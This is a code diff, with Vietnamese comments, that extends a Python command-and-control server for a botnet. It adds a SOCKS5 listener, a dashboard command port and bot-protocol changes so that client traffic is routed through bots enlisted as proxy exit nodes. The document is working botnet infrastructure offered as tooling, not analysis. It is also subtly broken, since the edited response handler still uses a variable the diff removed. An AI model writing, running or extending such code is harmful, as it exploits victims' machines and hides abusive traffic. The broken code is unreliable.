@@ -17,10 +17,14 @@ import random
 import ssl
 
 class C2ProxyServer:
-    def __init__(self, c2_host="0.0.0.0", c2_port=3333, proxy_port=8080):
+    def __init__(self, c2_host="0.0.0.0", c2_port=3333, proxy_port=8080, socks_port=1080, client_port=3334):
         self.c2_host = c2_host
         self.c2_port = c2_port
         self.proxy_port = proxy_port
+        self.socks_port = socks_port
+        self.client_port = client_port
+        # Load balancing strategy (round_robin, least_connections, health_based, random)
+        self.load_balancing_strategy = "round_robin"
         
         # Bot management
         self.connected_bots = {}  # bot_id -> bot_info
@@ -43,28 +47,74 @@ class C2ProxyServer:
         # Server sockets
         self.c2_socket = None
         self.proxy_socket = None
+        self.socks_socket = None
+        self.client_socket = None
         self.running = False
         
     def start(self):
         """Khởi động C2 Proxy Server"""
         print("🚀 Starting C2 Proxy Server...")
         
+        # Đặt cờ chạy TRƯỚC khi khởi động các threads accept
+        # Tránh tình trạng threads kiểm tra self.running=False và thoát ngay
+        self.running = True
+
         # Khởi động C2 server để nhận bot connections
         self.start_c2_server()
         
         # Khởi động proxy server để nhận client requests
         self.start_proxy_server()
         
+        # Khởi động SOCKS5 server
+        self.start_socks_server()
+        
+        # Khởi động client server để nhận commands từ web dashboard
+        self.start_client_server()
+        
         # Khởi động health monitoring
         self.start_health_monitoring()
-        
-        self.running = True
         print(f"✅ C2 Proxy Server started successfully!")
         print(f"   🖥️  C2 Server: {self.c2_host}:{self.c2_port}")
-        print(f"   🌐 Proxy Server: {self.c2_host}:{self.proxy_port}")
+        print(f"   🌐 HTTP Proxy: {self.c2_host}:{self.proxy_port}")
+        print(f"   🧦 SOCKS5 Proxy: {self.c2_host}:{self.socks_port}")
+        print(f"   🔗 Client Server: {self.c2_host}:{self.client_port}")
         print(f"   ⏰ Started at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
         print(f"   🔄 Waiting for bot connections...")
-        print(f"   📊 Ready to handle proxy requests...")
+        print(f"   📊 Ready to handle HTTP proxy requests...")
+        print(f"   🧦 Ready to handle SOCKS5 proxy requests...")
+        print(f"   🌐 Ready to handle client commands...")
+
+    def set_load_balancing_strategy(self, strategy: str) -> bool:
+        """Đổi chiến lược cân bằng tải"""
+        allowed = {"round_robin", "least_connections", "health_based", "random"}
+        if strategy not in allowed:
+            print(f"❌ Invalid strategy: {strategy}")
+            return False
+        self.load_balancing_strategy = strategy
+        print(f"⚖️  Load balancing strategy set to: {strategy}")
+        return True
+
+    def stop_bot(self, bot_id: str) -> bool:
+        """Ngắt kết nối bot theo id"""
+        try:
+            if bot_id in self.connected_bots:
+                self.disconnect_bot(bot_id)
+                return True
+            return False
+        except Exception as e:
+            print(f"❌ stop_bot error: {e}")
+            return False
+
+    def restart(self) -> bool:
+        """Khởi động lại server (dừng và khởi động lại)"""
+        try:
+            self.stop()
+            time.sleep(0.5)
+            self.start()
+            return True
+        except Exception as e:
+            print(f"❌ Restart failed: {e}")
+            return False
         
     def start_c2_server(self):
         """Khởi động C2 server để nhận kết nối từ bot"""
@@ -85,6 +135,26 @@ class C2ProxyServer:
         
         # Thread để accept proxy requests
         threading.Thread(target=self.accept_proxy_requests, daemon=True).start()
+        
+    def start_socks_server(self):
+        """Khởi động SOCKS5 server"""
+        self.socks_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.socks_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        self.socks_socket.bind((self.c2_host, self.socks_port))
+        self.socks_socket.listen(100)
+        
+        # Thread để accept SOCKS5 connections
+        threading.Thread(target=self.accept_socks_connections, daemon=True).start()
+        
+    def start_client_server(self):
+        """Khởi động client server để nhận commands từ web dashboard"""
+        self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        self.client_socket.bind((self.c2_host, self.client_port))
+        self.client_socket.listen(100)
+        
+        # Thread để accept client connections
+        threading.Thread(target=self.accept_client_connections, daemon=True).start()
         
     def accept_bot_connections(self):
         """Accept kết nối từ bot"""
@@ -122,12 +192,49 @@ class C2ProxyServer:
                 if self.running:
                     print(f"❌ Error accepting proxy request: {e}")
                     
+    def accept_socks_connections(self):
+        """Accept SOCKS5 connections từ client"""
+        while self.running:
+            try:
+                client_socket, client_addr = self.socks_socket.accept()
+                print(f"🧦 New SOCKS5 connection from {client_addr}")
+                
+                # Thread để xử lý SOCKS5 request
+                threading.Thread(
+                    target=self.handle_socks_request,
+                    args=(client_socket, client_addr),
+                    daemon=True
+                ).start()
+                
+            except Exception as e:
+                if self.running:
+                    print(f"❌ Error accepting SOCKS5 connection: {e}")
+                    
+    def accept_client_connections(self):
+        """Accept client connections từ web dashboard"""
+        while self.running:
+            try:
+                client_socket, client_addr = self.client_socket.accept()
+                print(f"🔗 New client connection from {client_addr}")
+                
+                # Thread để xử lý client commands
+                threading.Thread(
+                    target=self.handle_client_commands,
+                    args=(client_socket, client_addr),
+                    daemon=True
+                ).start()
+                
+            except Exception as e:
+                if self.running:
+                    print(f"❌ Error accepting client connection: {e}")
+                    
     def handle_bot_connection(self, bot_socket, bot_addr):
         """Xử lý kết nối từ bot"""
         bot_id = None
         try:
             # Nhận thông tin bot
             data = bot_socket.recv(1024).decode().strip()
+            print(f"🔍 DEBUG: Received from {bot_addr}: '{data}'")
             if data.startswith("BOT_CONNECT:"):
                 parts = data.split(":")
                 if len(parts) >= 4:
@@ -176,29 +283,69 @@ class C2ProxyServer:
             bot_socket = bot_info['socket']
             
             # Gửi lệnh bật proxy mode
-            command = "ENABLE_PROXY_MODE"
+            command = "ENABLE_PROXY_MODE\n"
             bot_socket.send(command.encode())
             
-            # Đăng ký bot làm exit node
-            self.bot_exit_nodes[bot_id] = {
-                'bot_id': bot_id,
-                'status': 'active',
-                'connections': 0,
-                'max_connections': 50,
-                'health_score': 100,
-                'response_time': deque(maxlen=100),
-                'last_health_check': datetime.now(),
-                'total_requests': 0,
-                'successful_requests': 0,
-                'failed_requests': 0
-            }
+            # Đợi response từ bot (có thể nhận heartbeat trước)
+            timeout = 10  # 10 seconds timeout
+            start_time = time.time()
+            response = None
             
-            bot_info['proxy_mode'] = True
-            print(f"🔗 Bot {bot_id} enabled as proxy exit node")
-            print(f"   🚀 Proxy mode: ACTIVE")
-            print(f"   📊 Max connections: {self.bot_exit_nodes[bot_id]['max_connections']}")
-            print(f"   💚 Health score: {self.bot_exit_nodes[bot_id]['health_score']}")
-            print(f"   🔄 Total exit nodes: {len(self.bot_exit_nodes)}")
+            while time.time() - start_time < timeout:
+                try:
+                    data = bot_socket.recv(1024).decode().strip()
+                    if data:
+                        print(f"🔍 DEBUG: Bot {bot_id} response: '{data}'")
+                        if data == "PROXY_MODE_ENABLED":
+                            response = data
+                            break
+                        elif data.startswith("HEARTBEAT:"):
+                            # Ignore heartbeat, continue waiting
+                            continue
+                        else:
+                            # Other response, might be what we want
+                            response = data
+                            break
+                except Exception as e:
+                    print(f"❌ Error reading response: {e}")
+                    break
+            
+            if response == "PROXY_MODE_ENABLED":
+                # Đăng ký bot làm exit node
+                self.bot_exit_nodes[bot_id] = {
+                    'bot_id': bot_id,
+                    'status': 'active',
+                    'connections': 0,
+                    'max_connections': 50,
+                    'health_score': 100,
+                    'response_time': deque(maxlen=100),
+                    'last_health_check': datetime.now(),
+                    'total_requests': 0,
+                    'successful_requests': 0,
+                    'failed_requests': 0
+                }
+                
+                # Đăng ký bot vào load balancer
+                self.load_balancer.register_bot(bot_id, {
+                    'status': 'active',
+                    'connections': 0,
+                    'max_connections': 50,
+                    'health_score': 100,
+                    'response_time': deque(maxlen=100),
+                    'last_health_check': datetime.now(),
+                    'total_requests': 0,
+                    'successful_requests': 0,
+                    'failed_requests': 0
+                })
+                
+                bot_info['proxy_mode'] = True
+                print(f"🔗 Bot {bot_id} enabled as proxy exit node")
+                print(f"   🚀 Proxy mode: ACTIVE")
+                print(f"   📊 Max connections: {self.bot_exit_nodes[bot_id]['max_connections']}")
+                print(f"   💚 Health score: {self.bot_exit_nodes[bot_id]['health_score']}")
+                print(f"   🔄 Total exit nodes: {len(self.bot_exit_nodes)}")
+            else:
+                print(f"❌ Bot {bot_id} failed to enable proxy mode. Response: {response}")
             
         except Exception as e:
             print(f"❌ Error enabling proxy mode for bot {bot_id}: {e}")
@@ -217,11 +364,11 @@ class C2ProxyServer:
                     
                 elif data.startswith("PROXY_RESPONSE:"):
                     # Nhận response từ bot
-                    self.handle_bot_proxy_response(bot_id, data[15:])
+                    self.handle_bot_proxy_response(bot_id, data)
                     
                 elif data.startswith("PROXY_ERROR:"):
                     # Nhận error từ bot
-                    self.handle_bot_proxy_error(bot_id, data[12:])
+                    self.handle_bot_proxy_error(bot_id, data)
                     
                 elif data.startswith("HEALTH_REPORT:"):
                     # Nhận health report từ bot
@@ -230,6 +377,89 @@ class C2ProxyServer:
             except Exception as e:
                 print(f"❌ Error handling commands from bot {bot_id}: {e}")
                 break
+                
+    def serialize_for_json(self, obj):
+        """Convert objects to JSON serializable format"""
+        if isinstance(obj, datetime):
+            return obj.isoformat()
+        elif isinstance(obj, dict):
+            return {k: self.serialize_for_json(v) for k, v in obj.items()}
+        elif isinstance(obj, list):
+            return [self.serialize_for_json(item) for item in obj]
+        elif isinstance(obj, tuple):
+            return list(obj)
+        else:
+            return obj
+
+    def handle_client_commands(self, client_socket, client_addr):
+        """Xử lý commands từ client (web dashboard)"""
+        try:
+            data = client_socket.recv(4096).decode().strip()
+            print(f"🔍 DEBUG: Received command from {client_addr}: '{data}'")
+            if not data:
+                return
+                
+            if data == "GET_STATUS":
+                # Gửi trạng thái server
+                status = self.get_status()
+                response = json.dumps(status, default=str, indent=2)
+                print(f"🔍 DEBUG: Sending response: {response[:200]}...")
+                client_socket.send(response.encode())
+                
+            elif data == "GET_BOTS":
+                # Gửi danh sách bots
+                bots = []
+                for bot_id, bot_info in self.connected_bots.items():
+                    exit_node_info = self.bot_exit_nodes.get(bot_id, {})
+                    bot_data = {
+                        'bot_id': bot_id,
+                        'hostname': bot_info.get('hostname', 'Unknown'),
+                        'address': bot_info.get('address', ('Unknown', 0)),
+                        'status': bot_info.get('status', 'unknown'),
+                        'connected_at': bot_info.get('connected_at', datetime.now()).isoformat(),
+                        'last_seen': bot_info.get('last_seen', datetime.now()).isoformat(),
+                        'proxy_mode': bot_info.get('proxy_mode', False),
+                        'requests_handled': bot_info.get('requests_handled', 0),
+                        'bytes_transferred': bot_info.get('bytes_transferred', 0),
+                        'exit_node_info': {
+                            'status': exit_node_info.get('status', 'inactive'),
+                            'connections': exit_node_info.get('connections', 0),
+                            'max_connections': exit_node_info.get('max_connections', 0),
+                            'health_score': exit_node_info.get('health_score', 0),
+                            'total_requests': exit_node_info.get('total_requests', 0),
+                            'successful_requests': exit_node_info.get('successful_requests', 0),
+                            'failed_requests': exit_node_info.get('failed_requests', 0)
+                        }
+                    }
+                    bots.append(bot_data)
+                response = json.dumps(bots, default=str, indent=2)
+                client_socket.send(response.encode())
+                
+            elif data == "GET_CONNECTIONS":
+                # Gửi danh sách kết nối
+                connections = []
+                for conn_id, conn_info in self.active_proxy_connections.items():
+                    connection_data = {
+                        'connection_id': conn_id,
+                        'client_addr': conn_info.get('client_addr', ('Unknown', 0)),
+                        'bot_id': conn_info.get('bot_id', 'Unknown'),
+                        'target_host': conn_info.get('target_host', 'Unknown'),
+                        'target_port': conn_info.get('target_port', 0),
+                        'is_https': conn_info.get('is_https', False),
+                        'start_time': conn_info.get('start_time', datetime.now()).isoformat(),
+                        'bytes_transferred': conn_info.get('bytes_transferred', 0)
+                    }
+                    connections.append(connection_data)
+                response = json.dumps(connections, default=str, indent=2)
+                client_socket.send(response.encode())
+                
+        except Exception as e:
+            print(f"❌ Error handling client commands: {e}")
+        finally:
+            try:
+                client_socket.close()
+            except:
+                pass
                 
     def handle_proxy_request(self, client_socket, client_addr):
         """Xử lý proxy request từ client"""
@@ -250,7 +480,7 @@ class C2ProxyServer:
                 return
                 
             # Chọn bot exit node
-            selected_bot = self.load_balancer.select_bot(self.bot_exit_nodes)
+            selected_bot = self.load_balancer.select_bot(self.bot_exit_nodes, strategy=self.load_balancing_strategy)
             if not selected_bot:
                 print(f"❌ No available exit nodes for proxy request from {client_addr}")
                 client_socket.send(b"HTTP/1.1 503 Service Unavailable\r\n\r\n")
@@ -320,6 +550,112 @@ class C2ProxyServer:
             
         return None, None, False
         
+    def handle_socks_request(self, client_socket, client_addr):
+        """Xử lý SOCKS5 request từ client"""
+        connection_id = f"socks_{client_addr[0]}:{client_addr[1]}:{int(time.time())}"
+        
+        try:
+            # SOCKS5 handshake
+            # Step 1: Client sends version and authentication methods
+            data = client_socket.recv(1024)
+            if len(data) < 3:
+                client_socket.close()
+                return
+                
+            version, nmethods = data[0], data[1]
+            if version != 5:  # SOCKS5
+                client_socket.close()
+                return
+                
+            # Step 2: Server responds with chosen method (0 = no auth)
+            client_socket.send(b'\x05\x00')
+            
+            # Step 3: Client sends connection request
+            data = client_socket.recv(1024)
+            if len(data) < 10:
+                client_socket.close()
+                return
+                
+            version, cmd, rsv, atyp = data[0], data[1], data[2], data[3]
+            if version != 5 or cmd != 1:  # CONNECT command
+                client_socket.close()
+                return
+                
+            # Parse destination address
+            if atyp == 1:  # IPv4
+                target_host = socket.inet_ntoa(data[4:8])
+                target_port = int.from_bytes(data[8:10], 'big')
+            elif atyp == 3:  # Domain name
+                addr_len = data[4]
+                target_host = data[5:5+addr_len].decode()
+                target_port = int.from_bytes(data[5+addr_len:7+addr_len], 'big')
+            else:
+                client_socket.close()
+                return
+                
+            print(f"🧦 SOCKS5 request from {client_addr}")
+            print(f"   🎯 Target: {target_host}:{target_port}")
+            print(f"   🔗 Connection ID: {connection_id}")
+            
+            # Chọn bot exit node
+            selected_bot = self.load_balancer.select_bot(self.bot_exit_nodes, strategy=self.load_balancing_strategy)
+            if not selected_bot:
+                print(f"❌ No available exit nodes for SOCKS5 request from {client_addr}")
+                # Send SOCKS5 error response
+                client_socket.send(b'\x05\x01\x00\x01\x00\x00\x00\x00\x00\x00')
+                client_socket.close()
+                return
+                
+            # Tạo proxy connection
+            self.active_proxy_connections[connection_id] = {
+                'client_socket': client_socket,
+                'client_addr': client_addr,
+                'bot_id': selected_bot,
+                'target_host': target_host,
+                'target_port': target_port,
+                'is_https': False,  # SOCKS5 doesn't distinguish HTTP/HTTPS
+                'is_socks': True,
+                'start_time': datetime.now(),
+                'bytes_transferred': 0
+            }
+            
+            # Send SOCKS5 success response
+            client_socket.send(b'\x05\x00\x00\x01\x00\x00\x00\x00\x00\x00')
+            
+            # Forward request đến bot
+            self.forward_socks_request_to_bot(connection_id, target_host, target_port)
+            
+            # Update statistics
+            self.stats['total_requests'] += 1
+            self.stats['active_connections'] += 1
+            
+        except Exception as e:
+            print(f"❌ Error handling SOCKS5 request: {e}")
+            self.stats['failed_requests'] += 1
+        finally:
+            if connection_id in self.active_proxy_connections:
+                self.cleanup_proxy_connection(connection_id)
+                
+    def forward_socks_request_to_bot(self, connection_id, target_host, target_port):
+        """Forward SOCKS5 request đến bot exit node"""
+        try:
+            connection = self.active_proxy_connections[connection_id]
+            bot_id = connection['bot_id']
+            bot_info = self.connected_bots[bot_id]
+            bot_socket = bot_info['socket']
+            
+            # Tạo command để gửi đến bot
+            command = f"SOCKS_REQUEST:{connection_id}:{target_host}:{target_port}\n"
+            bot_socket.send(command.encode())
+            
+            # Update bot statistics
+            self.bot_exit_nodes[bot_id]['connections'] += 1
+            self.bot_exit_nodes[bot_id]['total_requests'] += 1
+            
+        except Exception as e:
+            print(f"❌ Error forwarding SOCKS5 request to bot: {e}")
+            self.stats['failed_requests'] += 1
+        
     def forward_request_to_bot(self, connection_id, request_data):
         """Forward request đến bot exit node"""
         try:
@@ -329,7 +665,7 @@ class C2ProxyServer:
             bot_socket = bot_info['socket']
             
             # Tạo command để gửi đến bot
-            command = f"PROXY_REQUEST:{connection_id}:{connection['target_host']}:{connection['target_port']}:{connection['is_https']}"
+            command = f"PROXY_REQUEST:{connection_id}:{connection['target_host']}:{connection['target_port']}:{str(connection['is_https']).lower()}\n"
             bot_socket.send(command.encode())
             
             # Gửi request data
@@ -346,18 +682,20 @@ class C2ProxyServer:
     def handle_bot_proxy_response(self, bot_id, response_data):
         """Xử lý response từ bot"""
         try:
-            # Parse response để lấy connection_id
-            lines = response_data.split('\n')
-            if lines[0].startswith('CONNECTION_ID:'):
-                connection_id = lines[0].split(':', 1)[1]
-                actual_response = '\n'.join(lines[1:])
-                
+            # Bot gửi theo định dạng: "PROXY_RESPONSE:<id>\n" + raw bytes tiếp theo
+            if response_data.startswith('PROXY_RESPONSE:'):
+                header, _, rest = response_data.partition('\n')
+                connection_id = header.split(':', 1)[1]
                 if connection_id in self.active_proxy_connections:
                     connection = self.active_proxy_connections[connection_id]
                     client_socket = connection['client_socket']
-                    
-                    # Forward response về client
-                    client_socket.send(actual_response.encode())
+                    # Ở đây chỉ có phần sau header ở buffer hiện tại; dữ liệu tiếp theo sẽ tiếp tục được stream bởi bot.
+                    # Nếu có phần rest (bytes sau newline đã đến), forward ngay phần đó.
+                    if rest:
+                        try:
+                            client_socket.send(rest.encode())
+                        except Exception:
+                            pass
                     
                     # Update statistics
                     bytes_transferred = len(actual_response)
@@ -374,9 +712,10 @@ class C2ProxyServer:
     def handle_bot_proxy_error(self, bot_id, error_data):
         """Xử lý error từ bot"""
         try:
-            # Parse error để lấy connection_id
-            if error_data.startswith('CONNECTION_ID:'):
-                connection_id = error_data.split(':', 1)[1]
+            # Bot gửi theo định dạng: "PROXY_ERROR:<id>:<message>"
+            if error_data.startswith('PROXY_ERROR:'):
+                parts = error_data.split(':', 2)
+                connection_id = parts[1] if len(parts) > 1 else None
                 
                 if connection_id in self.active_proxy_connections:
                     connection = self.active_proxy_connections[connection_id]
@@ -470,12 +809,17 @@ class C2ProxyServer:
         
     def get_status(self):
         """Lấy trạng thái server"""
+        # Convert stats to serializable format
+        stats = self.stats.copy()
+        if 'start_time' in stats and isinstance(stats['start_time'], datetime):
+            stats['start_time'] = stats['start_time'].isoformat()
+            
         return {
             'running': self.running,
             'connected_bots': len(self.connected_bots),
             'active_exit_nodes': len(self.bot_exit_nodes),
             'active_proxy_connections': len(self.active_proxy_connections),
-            'stats': self.stats,
+            'stats': stats,
             'bots': list(self.connected_bots.keys()),
             'exit_nodes': list(self.bot_exit_nodes.keys())
         }
@@ -506,6 +850,10 @@ class C2ProxyServer:
             self.c2_socket.close()
         if self.proxy_socket:
             self.proxy_socket.close()
+        if self.socks_socket:
+            self.socks_socket.close()
+        if self.client_socket:
+            self.client_socket.close()
             
         print("✅ C2 Proxy Server stopped")
 
@@ -564,7 +912,7 @@ class BotHealthMonitor:
                         
                 # Send ping to bot
                 bot_socket = bot_info['socket']
-                bot_socket.send("PING".encode())
+                bot_socket.send("PING\n".encode())
                 
             except Exception as e:
                 print(f"❌ Health check failed for bot {bot_id}: {e}")
@@ -577,13 +925,14 @@ def main():
     
     parser = argparse.ArgumentParser(description="C2 Proxy Server")
     parser.add_argument("--c2-host", default="0.0.0.0", help="C2 server host")
-    parser.add_argument("--c2-port", type=int, default=7777, help="C2 server port")
-    parser.add_argument("--proxy-port", type=int, default=8080, help="Proxy server port")
+    parser.add_argument("--c2-port", type=int, default=3333, help="C2 server port")
+    parser.add_argument("--proxy-port", type=int, default=8080, help="HTTP proxy server port")
+    parser.add_argument("--socks-port", type=int, default=1080, help="SOCKS5 proxy server port")
     
     args = parser.parse_args()
     
     # Create and start server
-    server = C2ProxyServer(args.c2_host, args.c2_port, args.proxy_port)
+    server = C2ProxyServer(args.c2_host, args.c2_port, args.proxy_port, args.socks_port)
     
     try:
         server.start()
